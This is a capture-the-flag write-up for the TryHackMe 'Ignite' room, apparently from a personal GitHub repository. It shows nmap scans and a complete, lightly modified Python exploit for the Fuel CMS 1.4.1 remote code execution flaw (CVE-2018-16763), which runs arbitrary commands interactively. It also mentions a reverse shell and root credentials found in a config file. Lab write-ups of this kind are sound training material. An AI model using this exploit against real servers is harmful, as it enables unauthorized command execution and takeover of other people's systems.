
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-1.png)

This room was pretty straightforward, i exploited a poorly configured CMS.

Let's start with a ports scanning.

```text
nmap -sS -T 4 -p- 10.10.164.36
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 06:25 EDT
Nmap scan report for 10.10.164.36
Host is up (0.099s latency).
Not shown: 65534 closed ports
PORT STATE SERVICE
80/tcp open http
```
This machine has only one port open. I will do another scan, but in more depth for this port.

```text
nmap -sV -sC -p80 10.10.164.36
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 06:33 EDT
Nmap scan report for 10.10.164.36
Host is up (0.11s latency).

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

```

The webpage is the default welcome page of Fuel CMS. What i can notice about this page is the CMS version, 1.4, and the default credentials for user admin.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-2.png)

Let's check if this version is vulnerable to any CVE. Luckily i found the following exploit.

It is worth noting that i modified a bit the code.
```python
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

# python2
import requests
import urllib

# set the target
url = "http://10.10.164.36"

# find
def find_nth_overlapping(haystack, needle, n):
start = haystack.find(needle)
while start >= 0 and n > 1:
start = haystack.find(needle, start+1)
n -= 1
return start

while 1:
# give a unix command (Ex. id)
command = raw_input('cmd:')

# this is the payload url encoded
burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(command)+"%27%29%2b%27"

# this proxy receives the response
proxy = {"http":"http://10.10.164.36:1234"}
r = requests.get(burp0_url)

# find the beginning of the file
html = "<!DOCTYPE html>"
htmlcharset = r.text.find(html)

# find the start of the command response to display it at the top
begin = r.text[0:20]
dup = find_nth_overlapping(r.text,begin,2)

print r.text[0:dup]
```

Let's run the code with the command uname -a.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-4.png)

Based on the results, the exploit worked. Now i need to create a reverse shell to ease the privesc.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-5.png)

Now that i am on the system, i will look for the flags, starting with the user flag.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-6.png)

The escalation to root wasn't that difficult to find, as i kept looking through the files and found the root credentials in a configuration file.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-7.png)

Now i need to logi as root and read the last flag.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Ignite/images/81-8.png)
